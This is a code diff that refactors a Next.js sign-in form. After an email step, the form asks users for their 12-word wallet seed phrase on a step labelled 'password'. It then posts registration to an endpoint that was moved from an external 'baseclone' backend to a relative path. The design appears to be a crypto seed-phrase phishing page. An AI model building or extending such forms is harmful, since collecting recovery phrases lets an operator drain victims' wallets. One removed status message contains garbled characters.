@@ -1,40 +1,34 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import Link from "next/link";
-import { useRouter, useSearchParams } from "next/navigation";
+import { useRouter } from "next/navigation";
+
+// Helper validation functions
+function validateSeedPhrase(phrase) {
+  if (!phrase) return false;
+  const words = phrase.trim().split(/\s+/).filter(Boolean);
+  return words.length === 12;
+}
+
+function validateReferralCode(code) {
+  if (!code) return true;
+  const codePattern = /^[a-zA-Z0-9]{8,16}$/;
+  return codePattern.test(code);
+}
 
 export default function SigninForm({ referralCode, initialEmail, initialStep }) {
   const router = useRouter();
-  const searchParams = useSearchParams();
-  const [email, setEmail] = useState(initialEmail);
+  const [email, setEmail] = useState(initialEmail || "");
   const [seedPhrase, setSeedPhrase] = useState("");
   const [status, setStatus] = useState("");
   const [showHelp, setShowHelp] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
-  const [currentStep, setCurrentStep] = useState(initialStep);
+  const [currentStep, setCurrentStep] = useState(initialStep || "email");
 
   const isSeedStep = currentStep === "password";
-  const emailReady = email.trim().length > 5;
+  const emailReady = (email || "").trim().length > 5;
   const seedReady = validateSeedPhrase(seedPhrase);
-
-  const validateSeedPhrase = (phrase) => {
-    const words = phrase.trim().split(/\s+/).filter(Boolean);
-    return words.length === 12;
-  };
-
-  // Build URLs while preserving the referral code
-  // Security: Validate referral code format to prevent injection attacks
-  const validateReferralCode = (code) => {
-    if (!code) return true;
-    // Only allow alphanumeric codes between 8-16 characters
-    const codePattern = /^[a-zA-Z0-9]{8,16}$/;
-    if (!codePattern.test(code)) {
-      setStatus('������ Invalid referral code format');
-      return false;
-    }
-    return true;
-  };
 
   const getUrlWithRef = (basePath, params = {}) => {
     const newParams = new URLSearchParams(params);
@@ -76,7 +70,7 @@ export default function SigninForm({ referralCode, initialEmail, initialStep }) 
         return;
       }
 
-      const response = await fetch("https://baseclone-backend.vercel.app/api/auth/register", {
+      const response = await fetch("/api/auth/register", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
